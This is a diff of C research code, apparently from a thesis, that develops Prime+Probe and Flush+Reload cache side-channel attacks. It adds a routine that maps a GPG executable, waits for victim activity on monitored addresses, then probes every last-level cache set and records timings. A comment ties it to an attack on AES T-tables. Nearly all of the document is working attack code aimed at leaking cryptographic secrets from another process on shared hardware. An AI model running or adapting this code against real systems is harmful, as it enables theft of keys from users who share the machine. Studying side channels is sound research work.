@@ -15,12 +15,12 @@
 #define MAX_TIMES_TO_CSV 300000
 #define BASE_CACHE_LINE_PTR(baseptr,set,way) (void *)(((unsigned int)baseptr) + ((set) * LL_CACHE_LINE_NUMBER_OF_BYTES) + ((way) * LL_CACHE_SIZE_OF_WAY))
 #define PREVIOUS_CACHE_LINE_PTR(baseptr,set,way) (void *)(((unsigned int)baseptr) + ((set) * LL_CACHE_LINE_NUMBER_OF_BYTES) + ((way) * LL_CACHE_SIZE_OF_WAY) + (sizeof(void *)))
-#define RANDOMIZESETPTRS 1
 #define PRIME_ANALYSIS_DATA_FILENAME "/home/root/thesis-code/prime_static_analysis.data"
 #define PROBE_ANALYSIS_DATA_FILENAME "/home/root/thesis-code/probe_static_analysis.data"
 #define MAX_TIMES_TO_OBTAIN_THRESHOLD 512*1024
 #define VARIATION_ANALYSIS_DATA_FILENAME "pp_llc_hit_miss_variation_static_analysis.data"
 #define VARIATION_ANALYSIS_DATA_DIRECTORY "/home/root/thesis-code/"
+#define RANDOMIZESETPTRS 0
 #define handle_error(msg) \
 	do { perror(msg); exit(EXIT_FAILURE); } while (0)
 
@@ -196,28 +196,57 @@ void disposel1cache(llcache_t *llcache) {
 unsigned int prime(llcache_t *cache, int set) {
 	int way = LL_CACHE_NUMBER_OF_WAYS;
 	unsigned int setcycles = 0;
-	void *setpointer = BASE_CACHE_LINE_PTR(cache->basepointer, set, 0);
+	void *setpointer;
+	if(RANDOMIZESETPTRS)
+		setpointer = BASE_CACHE_LINE_PTR(cache->basepointer, cache->randomized[set], 0);
+	else
+		setpointer = BASE_CACHE_LINE_PTR(cache->basepointer, set, 0);
+
+//	//TODO: REMOVE
+//	FILE * fp;
+//	fp = fopen (concat(VARIATION_ANALYSIS_DATA_DIRECTORY,"prime_log.txt"), "w+");
+//	//TODO: REMOVE
 	while (way--) {
 		//printf("PRIMEWAY 64B: %x\n", setpointer);
 		setcycles += timeaccessway(setpointer);
-		printf("PRIME POINTER: %x\n",setpointer);
-		//Transverse the pointer here
+//		//TODO: REMOVE
+//		fprintf(fp,"PRIME POINTER: %x\n",setpointer);
+//		//TODO: REMOVE
+//		//Transverse the pointer here
+//		printf("PRIME POINTER: %x\n",setpointer);
 		setpointer = (*(void **) setpointer);
 	}
+//	//TODO: REMOVE
+//	fclose(fp);
+//	//TODO: REMOVE
 	return setcycles;
 }
 
 unsigned int probe(llcache_t *cache, int set) {
 	int way = LL_CACHE_NUMBER_OF_WAYS;
 	unsigned int setcycles = 0;
-	void *setpointer = PREVIOUS_CACHE_LINE_PTR(cache->basepointer, set, 0);
+	void *setpointer;
+	if(RANDOMIZESETPTRS)
+		setpointer = PREVIOUS_CACHE_LINE_PTR(cache->basepointer, cache->randomized[set], LL_CACHE_NUMBER_OF_WAYS-1);
+	else
+		setpointer = PREVIOUS_CACHE_LINE_PTR(cache->basepointer, set, LL_CACHE_NUMBER_OF_WAYS-1);
+//	//TODO: REMOVE
+//	FILE * fp;
+//	fp = fopen (concat(VARIATION_ANALYSIS_DATA_DIRECTORY,"probe_log.txt"), "w+");
+//	//TODO: REMOVE
 	while (way--) {
 		//printf("PROBEWAY 64B: %x\n", setpointer);
 		setcycles += timeaccessway(setpointer);
-		printf("PROBE POINTER: %x\n",setpointer);
+//		//TODO: REMOVE
+//		fprintf(fp,"PROBE POINTER: %x\n",setpointer);
+//		//TODO: REMOVE
+//		printf("PROBE POINTER: %x\n",setpointer);
 		//Transverse the pointer here
 		setpointer = (*(void **) setpointer);
 	}
+//	//TODO: REMOVE
+//	fclose(fp);
+//	//TODO: REMOVE
 	return setcycles;
 }
 
@@ -272,28 +301,37 @@ void obtainevictiondata(int histogramsize, int histogramscale, int maxruns,
 	unsigned int set = getsetindex(physicaladdr);
 
 	//TODO: REMOVE
-	unsigned int set1, set2, way;
-	void *ptr = BASE_CACHE_LINE_PTR(cache->basepointer, 0, 0);
-	for (way = 0; way < LL_CACHE_NUMBER_OF_WAYS-1 ; ++way) {
-		for (set1 = 0; set1 < LL_CACHE_NUMBER_OF_SETS-1; ++set1) {
-			physicaladdr = getphysicaladdr(ptr, cache->pagemap);
-			set2 = getsetindex(physicaladdr);
-//			printf(
-//					"CYCLE SET1: %d & WAY: %d || SET FROM VA: %d || PTR: %x || PHYSICAL ADDR: %x \n",
-//					set1, way, set2, ptr, physicaladdr);
-			if (set == set2){
-				break;
-			}
-			ptr = (*(void **) ptr);
-			/*PASSAR ESTES RESULTADOS PARA UM FICHEIRO*/
-			/*ESTÁ A ANDAR DE 64 em 64 :O*/
-		}
+	unsigned int set1, set2,way;
+	void * ptr;
+	if(RANDOMIZESETPTRS)
+		ptr = BASE_CACHE_LINE_PTR(cache->basepointer, cache->randomized[0], 0);
+	else
+		ptr = BASE_CACHE_LINE_PTR(cache->basepointer, 0, 0);
+	for (set1 = 0; set1 < LL_CACHE_NUMBER_OF_SETS-1; ++set1) {
+		physicaladdr = getphysicaladdr(ptr, cache->pagemap);
+		set2 = getsetindex(physicaladdr);
+//			if(!RANDOMIZESETPTRS)
+//				printf(
+//						"CYCLE SET1: %d || SET FROM VA: %d || PTR: %x || PHYSICAL ADDR: %x \n",
+//						set1, set2, ptr, physicaladdr);
+//			else
+//				printf(
+//						"CYCLE SET1: %d || SET FROM VA: %d || PTR: %x || PHYSICAL ADDR: %x \n",
+//						cache->randomized[set1], set2, ptr, physicaladdr);
 		if (set == set2){
-//			printf("FOUND A MATCH!!\nCYCLE SET1: %d & WAY: %d \n",
-//								set1, way);
 			break;
 		}
+		ptr = (*(void **) ptr);
 	}
+//	if (set == set2){
+////			if(!RANDOMIZESETPTRS)
+////				printf("FOUND A MATCH!!\nCYCLE SET1: %d WAY: %d\n",
+////									set1,way);
+////			else
+////				printf("FOUND A MATCH!!\nCYCLE SET1: %d WAY: %d\n",
+////						cache->randomized[set1],way);
+//		break;
+//	}
 	//TODO: REMOVE
 
 	// Preparing for the hit histogram
@@ -316,7 +354,7 @@ void obtainevictiondata(int histogramsize, int histogramscale, int maxruns,
 	for (i = 0; i < maxruns; ++i) {
 		prime(cache, set);
 
-		acessway(array + MID_ARRAY);
+		accessway(array + MID_ARRAY);
 
 		unsigned int probetime = probe(cache, set) / histogramscale;
 		miss_counts[
@@ -332,8 +370,8 @@ void obtainevictiondata(int histogramsize, int histogramscale, int maxruns,
 	unsigned int missminindex = 0;
 //	printf("TSC:           HITS           MISSES\n");
 	for (i = 0; i < histogramsize; ++i) {
-		printf("%3d: %10zu %10zu\n", i * histogramscale, hit_counts[i],
-				miss_counts[i]);
+//		printf("%3d: %10zu %10zu\n", i * histogramscale, hit_counts[i],
+//				miss_counts[i]);
 		if (hitmax < hit_counts[i]) {
 			hitmax = hit_counts[i];
 			hitmaxindex = i;
@@ -394,6 +432,7 @@ void analysehitandmissvariation(int mappedsize, char *filename,
 	preparellcache(&cache, mappedsize);
 
 	for (i = 0; i < analysissize; ++i) {
+		printf("Analyzing... %d\n",i);
 		obtainevictiondata(/*Histogram size*/histogramsize, /*Histogram scale*/
 		histogramscale,
 		MAX_TIMES_TO_OBTAIN_THRESHOLD, evictiondata, cache);
@@ -408,14 +447,93 @@ void analysehitandmissvariation(int mappedsize, char *filename,
 	disposel1cache(cache);
 }
 
+/*WAIT VICTIM ACTIVITY WITH FLUSH+RELOAD*/
+#include <sys/stat.h>
+#define THRESHOLD 45
+#define GPG_MAX_SIZE_BYTES 4194304
+#define OUTPUTRAWDATA 1
+#define DELAYFORVICTIMACTIVITY 2800
+#define NUMBER_OF_EXE_ADDRS 3
+#define MAX_ADDRS_TO_MONITOR 10
+#define MAX_TIMES_TO_MONITOR_EACH_ADDRS 300000
+
+typedef struct waitforvictim {
+	int nr_addrs;
+	char* mapping_addr;
+	unsigned int analysis_array[MAX_TIMES_TO_MONITOR_EACH_ADDRS][NUMBER_OF_EXE_ADDRS];
+	long int exe_addrs[MAX_ADDRS_TO_MONITOR];
+} waitforvictim_t;
+
+void preparewaitforactivity(waitforvictim_t **waitforvictim) {
+//	*llcache = calloc(1, sizeof(llcache_t));
+//		(*llcache)->mappedsize = mappedsize;
+	*waitforvictim = calloc(1, sizeof(waitforvictim_t));
+
+	int fd_exe;
+	struct stat sbuff;
+
+	//obtain the addrs to monitor
+	(*waitforvictim)->nr_addrs = getaddrstomonitor(EXE_ADDRS_FILENAME,
+			(*waitforvictim)->exe_addrs);
+	if ((*waitforvictim)->nr_addrs != NUMBER_OF_EXE_ADDRS) {
+		handle_error("NUMBER OF EXE ADDRS ERROR");
+	}
+
+	//share the executable
+	fd_exe = open(EXE_FILENAME, O_RDONLY);
+	if (fd_exe == -1)
+		handle_error("open_exe_filename");
+	if (fstat(fd_exe, &sbuff) == -1)
+		handle_error("fstat");
+	(*waitforvictim)->mapping_addr = (char*) mmap(0, GPG_MAX_SIZE_BYTES,
+	PROT_READ, MAP_PRIVATE, fd_exe, 0);
+	if ((*waitforvictim)->mapping_addr == MAP_FAILED)
+		handle_error("mmap");
+	printf(".exe shared\n");
+}
+
+void waitforvictimactivity(waitforvictim_t *waitforvictim) {
+
+	unsigned long ptr_offset = (unsigned long) waitforvictim->mapping_addr;
+
+	unsigned long long start = getcurrenttsc();
+	fr_analysealladdrs(OUTPUTRAWDATA, waitforvictim->analysis_array[0],
+			ptr_offset, waitforvictim->exe_addrs, NUMBER_OF_EXE_ADDRS,
+			THRESHOLD);
+	do {
+		do {
+			start += DELAYFORVICTIMACTIVITY;
+		} while (missedvictimactivity(start));
+		fr_analysealladdrs(OUTPUTRAWDATA, waitforvictim->analysis_array[0],
+				ptr_offset, waitforvictim->exe_addrs, waitforvictim->nr_addrs,
+				THRESHOLD);
+	} while (!isvictimactive(waitforvictim->analysis_array[0],
+			waitforvictim->nr_addrs,
+			OUTPUTRAWDATA ? THRESHOLD : 2));
+}
+/*WAIT VICTIM ACTIVITY WITH FLUSH+RELOAD*/
+
+void analysellc(int set, llcache_t *cache, int maxruns) {
+	int i;
+
+	for (i = set; i < maxruns; i += LL_CACHE_NUMBER_OF_SETS) {
+
+		//Prime
+		prime(cache, set);
+
+		//Probe
+		cache->analysis[i] = probe(cache, set);
+	}
+}
+
 int main() {
 	llcache_t *cache;
 	evictiondata_t *evictiondata;
 	int mappedsize, maxruns;
 
-	const int histogramsize = 500;
+	const int histogramsize = 300;
 	const int histogramscale = 5;
-	const int analysissize = 30;
+	const int analysissize = 50;
 
 	// Paper Cache-access pattern attack on disaligned AES t-tables
 	// (3/4)^(4*3) = 1.367% probability LLC not being totally evicted
@@ -426,12 +544,12 @@ int main() {
 	evictiondata = calloc(1, sizeof(evictiondata_t));
 	preparellcache(&cache, mappedsize);
 
-	char filename[200] = "";
-	sprintf(filename, "%s%s", VARIATION_ANALYSIS_DATA_DIRECTORY,
-	VARIATION_ANALYSIS_DATA_FILENAME);
-
-	analysehitandmissvariation(mappedsize, filename, analysissize,
-			histogramsize, histogramscale);
+//	char filename[200] = "";
+//	sprintf(filename, "%s%s", VARIATION_ANALYSIS_DATA_DIRECTORY,
+//	VARIATION_ANALYSIS_DATA_FILENAME);
+//
+//	analysehitandmissvariation(mappedsize, filename, analysissize,
+//			histogramsize, histogramscale);
 
 	obtainevictiondata(histogramsize, histogramscale, maxruns, evictiondata,
 			cache);
@@ -445,6 +563,27 @@ int main() {
 		printf("Hits Rate: %lf\%\n", evictiondata->hitsrate);
 		printf("Eviction Rate: %lf\%\n", evictiondata->evictionrate);
 	}
+
+	waitforvictim_t *waitforvictim;
+	int setidx;
+
+	preparellcache(&cache, mappedsize);
+	preparewaitforactivity(&waitforvictim);
+
+	for (setidx = 0; setidx < LL_CACHE_NUMBER_OF_SETS; ++setidx) {
+		printf("\nWaiting for activity...\n");
+
+		waitforvictimactivity(waitforvictim);
+
+		//int setidx = 1;
+		printf("Analyse set number: %d\n", setidx);
+		analysellc(setidx, cache,MAX_TIMES_TO_CSV * LL_CACHE_NUMBER_OF_SETS);
+	}
+
+	arraytodatafilewithoutlabels(PROBE_ANALYSIS_DATA_FILENAME,
+			cache->analysis,
+			MAX_TIMES_TO_CSV, LL_CACHE_NUMBER_OF_SETS);
+
 	disposel1cache(cache);
 	return 0;
 }
